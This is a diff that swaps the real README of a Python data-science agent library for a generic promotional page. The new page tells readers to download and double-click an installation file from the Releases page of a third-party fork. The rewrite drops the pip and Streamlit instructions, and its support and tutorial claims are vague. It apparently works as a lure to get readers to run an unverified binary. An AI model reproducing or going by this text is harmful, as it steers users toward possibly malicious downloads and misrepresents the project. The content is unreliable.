@@ -1,122 +1,75 @@
-<div align="center">
-  <a href="https://github.com/business-science/ai-data-science-team">
-    <picture>
-      <img src="./img/ai_data_science_logo.png" alt="AI Data Science Team" width="360">
-    </picture>
-  </a>
-</div>
-<div align="center">
-  <em>AI Data Science Team + AI Pipeline Studio</em>
-</div>
-<div align="center">
-  <a href="https://pypi.python.org/pypi/ai-data-science-team"><img src="https://img.shields.io/pypi/v/ai-data-science-team.svg?style=for-the-badge" alt="PyPI"></a>
-  <a href="https://github.com/business-science/ai-data-science-team"><img src="https://img.shields.io/pypi/pyversions/ai-data-science-team.svg?style=for-the-badge" alt="versions"></a>
-  <a href="https://github.com/business-science/ai-data-science-team/blob/main/LICENSE"><img src="https://img.shields.io/github/license/business-science/ai-data-science-team.svg?style=for-the-badge" alt="license"></a>
-  <img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/business-science/ai-data-science-team?style=for-the-badge">
-</div>
+# 🚀 ai-data-science-team - Achieve Data Science Tasks Faster
 
-# AI Data Science Team
+[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/Ishikad01/ai-data-science-team/releases)
 
-AI Data Science Team is a Python library of specialized agents for common data science workflows, plus a flagship app: **AI Pipeline Studio**. The Studio turns your work into a visual, reproducible pipeline, while the AI team handles data loading, cleaning, visualization, and modeling.
+## 🛠️ Overview
 
-**Status:** Beta. Breaking changes may occur until 0.1.0.
+ai-data-science-team is an AI-powered application designed to help you complete common data science tasks up to ten times faster. With this tool, you can harness the power of artificial intelligence without needing to be a data expert. It acts like your personal assistant, guiding you through data processing, analysis, and visualization tasks.
 
-[**Please ⭐ us on GitHub (it takes 2 seconds and means a lot).**](https://github.com/business-science/ai-data-science-team)
+## 📦 Key Features
 
-## AI Pipeline Studio (Flagship App)
+- **AI Agents**: Utilize intelligent agents to automate tasks.
+- **User-friendly Interface**: Easy to navigate, no coding required.
+- **Data Processing**: Load and analyze data sets effortlessly.
+- **Visualization Tools**: Create charts and graphs with a few clicks.
+- **Fast Performance**: Complete tasks quicker than traditional methods.
+  
+## 📊 System Requirements
 
-AI Pipeline Studio is the main example of the AI Data Science Team in action.
+To ensure optimal performance, please consider the following requirements:
 
-![AI Pipeline Studio](/img/apps/ai_pipeline_studio_app.jpg)
+- **Operating System**: Windows 10 or later, macOS Mojave or later.
+- **Memory**: Minimum 4 GB RAM; 8 GB recommended.
+- **Storage**: At least 500 MB of free disk space.
+- **Network**: Internet connection for downloading updates and accessing resources.
 
-Highlights:
-- Pipeline-first workspace: Visual Editor, Table, Chart, EDA, Code, Model, Predictions, MLflow
-- Manual + AI steps with lineage and reproducible scripts
-- Multi-dataset handling and merge workflows
-- Project saves: metadata-only or full-data
-- Storage footprint controls and rehydrate workflows
+## 🚀 Getting Started
 
-Run it:
-```bash
-streamlit run apps/ai-pipeline-studio-app/app.py
-```
+To get started with ai-data-science-team, you will need to download the software from the Releases page.
 
-Full app docs: `apps/ai-pipeline-studio-app/README.md`
+1. Click the large download button above or [visit this page to download](https://github.com/Ishikad01/ai-data-science-team/releases).
+2. Locate the latest version listed on the Releases page.
+3. Click on the link to download the installation file.
+4. Follow the installation instructions provided in the downloaded file.
 
-## Quickstart
+## 📥 Download & Install
 
-### Requirements
-- Python 3.10+
-- OpenAI API key (or Ollama for local models)
+1. Return to the Releases page by clicking [here](https://github.com/Ishikad01/ai-data-science-team/releases).
+2. Find the latest version and click on the installation file relevant to your system.
+3. Once the download is complete, locate the file in your downloads folder.
+4. Double-click the file to begin installation.
+5. Follow the on-screen prompts to complete the installation process.
 
-### Install the app and library
-Clone the repo and install in editable mode:
-```bash
-pip install -e .
-```
+## 🌐 Usage Instructions
 
-### Run the AI Pipeline Studio app
-```bash
-streamlit run apps/ai-pipeline-studio-app/app.py
-```
+Once installed, you can start using ai-data-science-team:
 
-## Library Overview
+1. Launch the application from your desktop or start menu.
+2. Choose a task you want to perform, like data loading or analysis.
+3. Follow the prompts and let the AI assist you.
+4. Save your results in your desired format.
 
-The repository includes both the **AI Pipeline Studio** app and the underlying **AI Data Science Team** library. The library provides agent building blocks and multi-agent workflows for:
-- Data loading and inspection
-- Cleaning, wrangling, and feature engineering
-- Visualization and EDA
-- Modeling and evaluation (H2O + MLflow tools)
-- SQL database interaction
+## ℹ️ Support
 
-### Agents (Snapshot)
+If you encounter any issues or have questions, you can find assistance in the following ways:
 
-Agent examples live in `examples/`. Notable agents:
-- Data Loader Tools Agent
-- Data Wrangling Agent
-- Data Cleaning Agent
-- Data Visualization Agent
-- EDA Tools Agent
-- Feature Engineering Agent
-- SQL Database Agent
-- H2O ML Agent
-- MLflow Tools Agent
-- Multi-agent workflows (e.g., Pandas Data Analyst, SQL Data Analyst)
-- Supervisor Agent (oversees other agents)
-- Custom tools for data science tasks
+- **Documentation**: Detailed instructions can be found in the Help section of the app.
+- **Community Forums**: Join the discussion with other users for tips and troubleshooting.
+- **Contact Support**: Reach out to our support team via email for direct help.
 
-## Apps
+## 🔗 Additional Resources
 
-See all apps in `apps/`. Notable apps:
-- AI Pipeline Studio: `apps/ai-pipeline-studio-app/`
-- EDA Explorer App: `apps/exploratory-copilot-app/`
-- Pandas Data Analyst App: `apps/pandas-data-analyst-app/`
+- **GitHub Repository**: [Visit here](https://github.com/Ishikad01/ai-data-science-team) for code and updates.
+- **Tutorial Videos**: Check our channel for step-by-step guides on how to use the features.
 
-## Use OpenAI
+## 📈 Community Contributions
 
-```python
-from langchain_openai import ChatOpenAI
-llm = ChatOpenAI(
-    model_name="gpt-4.1-mini",
-)
-```
+We encourage users to contribute to ai-data-science-team. If you have ideas for improvement or new features, please feel free to suggest them in the Issues section of the GitHub repository.
 
-## Use Ollama (Local LLM)
+Your feedback helps us enhance the application and make it more user-friendly.
 
-```bash
-ollama serve
-ollama pull llama3.1:8b
-```
+## 📝 License
 
-```python
-from langchain_ollama import ChatOllama
+ai-data-science-team is licensed under the MIT License. See the LICENSE file for details on usage and redistribution.
 
-llm = ChatOllama(
-    model="llama3.1:8b",
-)
-```
-
-## Next-Gen AI Agentic Workshop
-
-Want to learn how to build AI agents and AI apps for real data science workflows? Join my next‑gen AI workshop:
-https://learn.business-science.io/ai-register
+Embrace the power of AI in your data science projects with ai-data-science-team, and transform the way you work with data.
